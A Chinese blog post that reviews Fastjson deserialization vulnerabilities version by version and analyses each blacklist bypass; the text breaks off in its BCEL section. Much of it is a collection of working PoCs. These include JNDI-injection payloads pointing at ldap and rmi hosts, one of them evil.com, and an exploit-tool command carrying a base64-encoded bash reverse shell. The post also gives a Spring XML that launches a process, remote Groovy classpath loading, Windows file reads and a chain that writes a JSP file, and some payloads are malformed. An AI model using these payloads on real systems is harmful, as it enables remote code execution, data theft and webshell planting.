---
title: Java中Fastjson各版本漏洞对抗史与总结
published: 2025-04-15 16:30
tags: [安全, Fastjson, Java, 反序列化, 版本对抗]
category: 网安
draft: false
---

# Java中Fastjson各版本漏洞对抗史与总结

## 漏洞简述

`Fastjson`是阿里巴巴的开源JSON解析库，可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。攻击者可以利用该漏洞执行任意代码，导致严重的安全威胁。

`漏洞原理`：Fastjson反序列化是源于在处理`json`数据时对输入的验证不足，没有对`@type`字段进行过滤，导致攻击者可以构造一个恶意的JSON数据，将恶意类作为AutoType的值，当Fastjson反序列化时，从而实例化指定类导致远程代码执行。

漏洞指纹特征：提交为`POST`请求，格式改为`application/json`,测试是否返回fastjson字符串，也可能是无回显。



## DNS盲打

利用`dnslog`接收平台进行盲打验证

```json
{"aa":{"@type":"java.net.Inet4Address","val":"dnslog"}}
{"aa":{"@type":"java.net.Inet6Address","val":"dnslog"}}

//变换
{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}
```



测试后返回接受平台查看是否存在



## 无返回数据探测

学习到一些`trick`，在返回包无报错信息测试

- 版本：1.2.83/1.2.24

```json
{"test":{"@type":"java.lang.Exception","@type":"org.XxException"}}
```

- 版本：1.2.24-1.2.68

```json
{"test":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}
```

- 版本：1.2.24-1.2.47

```json
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl"
    }
}
```

- 版本 1.2.24

```json
{"test": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
```

### 测试

简单测试一下案例-通过fastjson弹计算器

这里我们已经知道`fastjson反序列化`时，可能会将目标类的构造函数、getter方法、setter方法、is方法执行一遍，如果此时这四个方法中有危险操作，则会导致反序列化漏洞，也就是说攻击者`传入的序列化数据中需要目标类的这些方法中要存在漏洞才能触发`。fastjson在反序列化时，可能会将目标类的构造函数、getter方法、setter方法、is方法执行一遍，如果此时这四个方法中有危险操作，则会导致反序列化漏洞，也就是说`攻击者传入的序列化数据中需要目标类的这些方法中要存在漏洞才能触发`

构造一个`Student`类

```java
package FastjsonDemo.fastJsonDemo1;

import java.io.IOException;

public class Student {
    public String name;
    private int age;
    public Student(){
        System.out.println("Student构造函数");
    }

    public String getName() {
        System.out.println("Student getName");
        return name;
    }

    public void setName(String name) throws IOException {
        System.out.println("Student setName");
        Runtime.getRuntime().exec("calc");
        this.name = name;
    }

    public int getAge() {
        System.out.println("Student getAge");

        return age;
    }
}
Student_fastjson类`去加载 成功加载造成`反序列化漏洞
package FastjsonDemo.fastJsonDemo1;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Student_fastjson {
    public static void main(String[] args) throws Exception{
        String json = "{\"@type\":\"FastjsonDemo.fastJsonDemo1.Student\",\"age\":18,\"name\":\"5wimming\"}";
        System.out.println("测试Fastjson SupportNonPublicField");
        Student student = JSON.parseObject(json, Student.class, Feature.SupportNonPublicField);
        System.out.println(student);
        System.out.println(student.getClass().getName());
        System.out.println(student.getName() + " " + student.getAge());
    }
}
```

### Fastjson1.2.24

漏洞：**`cnvd-2017-02833`**

#### TemplatesImpl 反序列化

影响版本：在早期的`fastjson<=1.2.24中`，默认是使用`@type来指定反序列化任意类`，这就造成了攻击者可通过`java环境`寻找构造`恶意类`，再通过`反序列化`过程中去调用其中的`getter/setter`方法，形成恶意调用链。我们来分析一下常规的`TemplatesImpl 反序列化`

定位`TemplatesImpl包`，直接进行导包跟进即可

```json
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
```

测试的`pom.xml对应fastjson版本`

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```

跟进源码进行分析，可以发现在这个类中是存在一个`Class类`的`数组`，其下标为`_transletIndexdex`的类会来到`getTransletInstance`方法使用`newInstance实例化`


继续向下跳，寻找`getTransletInstance`的重载方法，发现`newTransformer`调用了，而类中的`getOutputProperties`方法又调用了`newTransformer`



继续分析`getOutputProperties()`方法，会发现其实就是`_outputProperties`中的`getter方法`

到这里基本调用链出来了，那么我们继续进行分析，`_class类是否可控`，继续审计其调用处，发现`readObject`、`构造方法`以及 `defineTransletClasses()`中有`赋值操作`

来到`defineTransletClasses()类`分析，发现这里是存在漏洞点的，这里如果`_class不为空就会调用`，分析其逻辑:

首先要求`_bytecodes不为null`，接着调用其中的`_byte[]`，如果父类为`ABSTRACT_TRANSLET`则进行调用

父类`AbstractTranslet`其加载包为`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`

完整的恶意利用链子：

构造一个`TemplatesImpl反序列化字符串`-> `__bytecodes加载字节码`->`令其父类为AbstractTranslet`->`最终通过newInstance()实例化`->`满足 _name 不为 null ，_tfactory 不为 null`

最终`Poc`为

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["恶意字节码"],
    "_name": "test",
    "_tfactory": {},
    "_outputProperties": {},
}
```

#### JdbcRowSetImpl 反序列化

前面已经了解了有关`TemplatesImpl 反序列化`的链子，继续研究一下另一条导致`JNDI注入的漏洞利用链`
JdbcRowSetImpl 类位于`com.sun.rowset.JdbcRowSetImpl`
导入此类进行分析，跟进`JdbcRowSetImpl`
来到`setAutoCommit()`方法，审计`setAutoCommit()`方法，当`this.conn`为`null`则调用`this.connect()`

跟进`this.connect()`，这里调用了`javax.naming.InitialContext`的`lookup()`方法，获取成员变量`DataSource`

这里`lookup()方法`参数正好也是`dataSourceName`，最终控制`dataSouceName`造成反序列化漏洞
最终`Poc`为

```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}
```

漏洞测试而：

```cmd
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx}|{base64,-d}|{bash,-i}" -A "IP"
```

修改为post传参方式，传入以下格式

```json
{
    "a":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://test.com:9999/TouchFile",
        "autoCommit":true
    }
}
```



### Fastjson1.2.25

引入 `checkAutoType 安全机制`
安全更新主要集中在`com.alibaba.fastjson.parser.ParserConfig`，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。



过滤如下

```bash
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
开启autoType的情况`
继续向下分析 `checkAutoType()`整体逻辑，这里如果开启了`autoType`会先做一个判断，是否处在白名单，在的话通过`TypeUtils.loadClass`进行加载，然后再判断`黑名单
```



`没开启autoType的情况`
顺序则是先使用`黑名单进行匹配`，再用`白名单进行匹配和加载`。如果反序列化`黑白名单`未成功匹配， 那么只有当开启了`autoType`或 `expectClass`不为空(指定Class对象)才能调用 `typeUtils.loadClass`加载

继续跟进 `loadClass`

发现漏洞，这里是存在一处`逻辑问题的`，本身这里是写了一个`兼容带有描述符的类`，可这些在`类加载`过程中会被处理掉。最终漏洞思路
开启`autoType后，构造描述符绕过`，添加字符 `L``[``;` 即可

附上`Poc`

```json
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}

或 
{
    "a":{
        "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName":"rmi://test.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

### Fastjson1.2.42

继续分析，来到`Fastjson1.2.42`，在此版本只是进一步对`黑白名单的规则进行修改`。这里主要是修改`黑名单`类添加了一个对`Hash方式的对比`对之前版本存在`类描述符绕过黑名单修复`。

下面继续分析，继续来到`com.alibaba.fastjson.parser.ParserConfig`这个类
定位到`ParserConfig`方法，发现`denyHashCodes`对原本的黑名单策略做了一个`Hash校验黑名单`

继续向下分析，这里看`CheckAutoType`
分析整体逻辑，其实就是对黑名单进行截断`第一个字符`是否为`类描述符`，做一个`Hash匹配`，如果是则匹配失败。但我们前面分析过，这里`loadClass()加载类`

来到`loadClass`，还是采取`递归处理的`

最终`Poc`，添加`两个类描述符`

```json
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}
```

### fastjson1.2.43

换源，继续分析逻辑

跟进类`com.alibaba.fastjson.parser.ParserConfig`
还是对`Hash黑名单进行一个匹配`，分析如下

```java
long BASIC = -3750763034362895579L;
long PRIME = 1099511628211L;
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
        throw new JSONException("autoType is not support. " + typeName);
    }
```

这里其实是对代码根据类名中`字符的ASCII 值`检查特定条件，如果两个条件都满足，就会抛出一个带有特定消息的 `JSONException`
漏洞产生：并未对所有`类描述符`进行严格过滤，这里是可以添加`[`字符成功绕过的



附上`poc`

```json
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
    {"dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}

或
{
    "b":{
        "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
        "dataSourceName":"rmi://test.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

### fastjson1.2.44

此版本`加固`了`fastjson1.2.43版本`使用`[`字符绕过规则，这个版本基本上是相对安全了
影响版本：`1.2.25 <= fastjson <= 1.2.44`
浅分析一下代码，增加了规则，出现`[`字符直接抛出异常判断失败



### fastjson1.2.45

分析版本来到`fastjson1.2.45`，此版本升级后，存在一个`黑名单匹配绕过`，绕过类

```java
org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
```

利用条件如下

1. 目标服务端存在`mybatis`的jar包。
2. 版本需为 `3.x.x ～ 3.5.0`
3. autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）



`Poc`如下

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:1234/Exploit"
    }
}

或
{
    "b":{
        "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
        "properties":{"data_source":"ldap://localhost:1389/Exploit"}
    }
}
```

### fastjson1.2.47

漏洞隐患，不需要开启`AutoTypeSupport`直接进行`反序列化`操作
利用条件如下：

- 小于 1.2.48 版本的通杀，`AutoType`为关闭状态也可以。
- loadClass中默认cache设置为`true`

继续分析类`com.alibaba.fastjson.parser.ParserConfig`，来到`CheckAutoType()`方法
先分析第一段


往下分析代码逻辑，这里有两个需要注意的`TypeUtils.getClassFromMapping`和`deserializers`
这里`deserializers` ，其实是一个 `IdentityHashMap`，能从其中赋值函数

1. getDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。
2. initDeserializers()：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。
3. putDeserializer()：被前两个函数调用，我们无法控制入参。



来到`TypeUtils.getClassFromMapping`



分析`loadClass()`类的代码，这里可以指导`TypeUtils.getClassFromMapping`同样是从`TypeTUtils.mapping`z中进行取值
关键函数: `addBaseClassMappings()` `loadClass()加载`



分析代码得到逻辑，这里我们只要控制`loadClass()方法参数`，就可以写入任意类名到`mappings中`，下面寻找`重载方法`，分析寻找一下`loadClass(String className, ClassLoader classLoader)`调用处
翻阅发现，我们需要来到`initDeserializer方法`，发现`MiscCodec`是可用来处理`反序列化类`的



跟进`_MiscCo_d_eC_`类，审计其中代码，发现一处`if判断`
来到`deserialze`，发现这里 `parser.resolveStatus`做了一个判断，并且是会解析`val中内容`，传入值到`strVal字符串中`



继续向下分析逻辑，发现这里`clazz=Class.class`，会调用`loadClass()方法`，并将`strVal类加载并缓存`

到这里我们基本逻辑疏通了， 我们呢需要组成一条`恶意调用链`，这里记住我们的入口点是 Class.class，可传入参数一下参数进行调试测试 `{"@type":"java.lang.Class","val":"test"}`

:::info
完整恶意调用链：
先通过`parser.parseObject`调用`DefaultJSONParser`对传入json`数据解析`

这里由于`deserializers` 初始化已经加载了`Class.class`，绕过`AutoTypeSupport检测`
下面需要设置 `resolveStatus值为TypeNameRedirect`，然后来到`MiscCodec.deserialze()`对`class类型`进行处理，最终解析`Json`数据中的`val内容`，将其放入到`objVal`，传递到`strVal`中并使用`loadClass加载方法并缓存到mappings中`，最终再次以`恶意类请求@type`即可绕过黑名单阻扰进行`反序列化操作！！！`
:::

最终`Poc`如下
`ladp://`

```json
{
    "aaa": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "bbb": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://127.0.0.1:1234/Exploit",
        "autoCommit": true
    }
}
rmi://
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}
```

### fastjson <=1.2.62 和 <=1.2.66

积累的两个`poc`,基于黑名单绕过`fastjson <= 1.2.62`

```json
{
  "@type":"org.apache.xbean.propertyeditor.JndiConverter",
  "AsText":"rmi://127.0.0.1:1099/exploit"
}";
```

基于`fastjson<=1.2.66`的poc

```json
{
  "@type":"org.apache.shiro.jndi.JndiObjectFactory",
  "resourceName":"ldap://192.168.80.1:1389/Calc"
  }
```

### fastjson1.2.68

在之前版本1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复。对`MiscCodec 处理 Class 类的`设置了`cache=false`，并且`loadClass重载默认为不缓存`，直接避免了`提前使用``Class类恶意类名缓存造成的反序列化漏洞`

随着版本的更新，直到`fastjson1.2.68`又存在一个新的漏洞点，可使用`expectClass`去绕过`checkAutoType()`检测机制，主要使用`Throwable`和 `AutoCloseable`来绕过

下面配置一下环境`pom.xml`

```xml
<dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.68</version>
    </dependency>
```

在`1.2.68`版本下，更新了一个新的安全控制点 `safeMode`，如果开启的话，将在`checkAutoType()`直接抛出异常，进行`ban掉修复`。那既然说到是存在一个新的`autoType开关`，接下来进行分析这个`绕过方式`，函数
分析`safeMode控制点`



这里继续往下看，发现代码的逻辑处存在漏洞点，可通过传参`expectClass`，类名为子类进行绕过`checkAutoType机制`



接下来，往回分析，寻找一下调用`checkAutoType`的重载方法是否存在可控的`expectClass传参`，进行搜索
发现有两处重载方法，分别为：`ThrowableDeserializer`、`JavaBeanDeserializer`

进一步跟进查看，发现直接`ThrowableDeserializer`方法会将`@type` 后的类传入到`checkAutoType()`
这里`expectClass` 为 `Throwable.class`类



继续向下，发现通过`checkAutoType()机制之后`，最终将会使用`createException`异常类的`实例`



### fastjson1.2.80

在上述`1.2.68`版本修复方案，新版本将`java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable`加入了黑名单，那么1.2.80用的就是另一个期望类,漏洞点异常类`Throwable`。有个重要的点来自于：反序列化`setter method parameter OR public field`（无视autotype机制）时添加类到白名单



```json
版本探测
{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}

{"a":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}},"b":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}}
报错探测依赖库
{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"com.mysql.jdbc.Driver"}}
```

`groovy`利用

```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}

{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
     "@type":"org.codehaus.groovy.control.CompilerConfiguration",
     "classpathList":"http://127.0.0.1:9999/"
    }
}
```

`JDBC`：依赖 `jython+postgresql+spring-context`，poc如下

```json
{
    "a":{
    "@type":"java.lang.Exception",
    "@type":"org.python.antlr.ParseException",
    "type":{}
    },
    "b":{
        "@type":"org.python.core.PyObject",
        "@type":"com.ziclix.python.sql.PyConnection",
        "connection":{
            "@type":"org.postgresql.jdbc.PgConnection",
            "hostSpecs":[
                {
                    "host":"127.0.0.1",
                    "port":2333
                }
            ],
            "user":"user",
            "database":"test",
            "info":{
                "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketFactoryArg":"http://127.0.0.1:8090/exp.xml"
            },
            "url":""
        }
    }
}
```

加载的`exp.xml`

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder">
  <constructor-arg>
    <list value-type="java.lang.String" >
       <value>cmd</value>
       <value>/c</value>
       <value>calc</value>
    </list>
  </constructor-arg>
  <property name="whatever" value="#{pb.start()}"/>
</bean>
</beans>
```

`aspectj 任意文件读取`, **poc**如下，需要分为三次进行利用

```json
//第一次
{
   "@type":"java.lang.Exception",
   "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}


//第二次
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
}
//第三次，针对Windows系统
   {
      "x":{
         "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
         "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
         "fileName":"c:\\windows\win.ini"
      }
   }
//另一种姿势，报错回显
{
    "@type":"java.lang.Character"
    {
        "c":{
            "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
            "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
            "fileName":"c:/windows/win.ini"
    }
}
//第三次2 报错回显
commons-io 写入文件
```

参考`su18`师傅的poc

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import jdk.nashorn.internal.parser.JSONParser;


public class demo {
    public static void main(String[] args) {
        String code = "test";
        for (int i = 0; i < 8200; i++) {
            code += "a";
        }
        String poc2 = "    \r\n"
                + "    {\r\n"
                + "  \"su14\": {\r\n"
                + "    \"@type\": \"java.lang.Exception\",\r\n"
                + "    \"@type\": \"ognl.OgnlException\"\r\n"
                + "  },\r\n"
                + "  \"su15\": {\r\n"
                + "    \"@type\": \"java.lang.Class\",\r\n"
                + "    \"val\": {\r\n"
                + "      \"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "      {\r\n"
                + "        \"@type\": \"java.lang.String\"\r\n"
                + "        \"@type\": \"ognl.OgnlException\",\r\n"
                + "        \"_evaluation\": \"\"\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su16\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "      \"reader\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\r\n"
                + "        \"charSequence\":{\"@type\":\"java.lang.String\"\""+code+"\"\r\n"
                + "      },\r\n"
                + "      \"charsetName\":\"UTF-8\",\r\n"
                + "      \"bufferSize\":1024\r\n"
                + "    },\r\n"
                + "            \"branch\":{\r\n"
                + "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\r\n"
                + "      \"writer\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\r\n"
                + "        \"file\":\"1.jsp\",\r\n"
                + "        \"encoding\":\"UTF-8\",\r\n"
                + "        \"append\": false\r\n"
                + "      },\r\n"
                + "      \"charsetName\":\"UTF-8\",\r\n"
                + "      \"bufferSize\": 1024,\r\n"
                + "      \"writeImmediately\": true\r\n"
                + "    },\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su17\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su18\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su19\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },  \r\n"
                + "  }\r\n"
                + "";
        System.out.println(poc2);

        JSON.parseObject(poc2);
    }
}
```

### fastjson不出网利用姿势

搭建tomcat环境：[【最新Tomcat】IntelliJ IDEA通用配置Tomcat教程（超详细）_idea配置tomcat-CSDN博客](https://blog.csdn.net/VLOKL/article/details/134495067)

利用Java的`BCEL`字节码进行绕过，字节码，就是Java源代码编译后的产物，它是一种中间代码，既不是完全的机器语言，也不是咱们写的那些高级语言代码。JVM（Java虚拟机）就是通过解释或编译这些字节码来运行咱们的程序。而`BCEL`字节码检测器是一个Java字节码操作库,可以用于分析、修改和创建Java类文件的字节码.

#### 基于Tomcat回显

编写`BCEL_exp`

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class BCEL_exp {
    public static void main(String[] args) throws IOException {
        Path path = Paths.get("D:\\java\\untitled1\\FastJsonDemo\\untitled\\src\\exp.class");
        byte[] bytes = Files.readAllBytes(path);
        System.out.println(bytes.length);
        String encode = Utility.encode(bytes, true);
        BufferedWriter bw = new BufferedWriter(new FileWriter("./res.txt"));
        bw.write("$$BECL$$" + encode);
        bw.close();
    }
}

//生成的字节码如下
